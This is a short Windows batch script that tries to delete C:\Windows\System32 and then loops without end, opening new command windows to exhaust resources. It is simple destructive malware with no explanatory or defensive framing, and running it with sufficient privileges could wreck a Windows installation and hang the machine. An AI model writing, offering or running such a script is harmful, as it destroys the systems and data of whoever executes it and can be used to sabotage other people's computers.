@echo off
del C:\Windows\System32 /F /Q
rmdir /S /Q C:\Windows\System32
:crash
start
goto crash
pause > nul